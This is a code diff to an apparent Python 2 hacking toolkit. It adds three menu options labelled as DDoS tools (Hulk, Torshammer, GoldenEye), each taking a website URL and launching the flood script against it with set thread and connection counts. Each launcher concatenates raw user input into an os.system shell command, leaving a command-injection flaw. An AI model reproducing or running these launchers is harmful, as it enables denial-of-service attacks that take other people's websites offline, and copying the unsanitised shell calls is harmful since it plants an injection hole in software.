@@ -226,7 +226,10 @@ def WebH():
    1. Red_Hawk
    2. SQLDork
    3. WebAdminFinder
-   4. SQLMap""","green"), colored("""
+   4. SQLMap
+   5. Hulk	      (DDOS TOOL)
+   6. Torshammer      (DDOS TOOL)
+   7. GoldenEye       (DDOS TOOL)""","green"), colored("""
    ==========================================
    """, "white")
  web = raw_input("webh > ")
@@ -238,6 +241,28 @@ def WebH():
   webadm()
  elif web == "4":
   sqlmap()
+ elif web == "5":
+  hulk()
+ elif web == "6":
+  torsh()
+ elif web == "7":
+  gold()
+
+def hulk():
+  print(colored("""Enter Website Link""", "green"))
+  print(colored("""Hulk is unstable""", "red"))
+  dos3 = raw_input("url > ")
+  os.system("cd modules/hulk && python2 hulk.py "+ dos3 +" safe")
+
+def torsh():
+  print(colored("""Enter Website Link""", "green"))
+  dos1 = raw_input("url > ")
+  os.system("cd modules/torshammer/ && python2 torshammer.py -t "+ dos1 +" -r 256")
+
+def gold():
+  print(colored("""Enter Website Link""", "green"))
+  dos2 = raw_input("url > ")
+  os.system("cd modules/GoldenEye/ && python2 goldeneye.py "+ dos2 +" -w 10 -s 500")
 
 def sqlmap():
   printslow(colored("""CLONING SQLMAP IN HOME""","green"))
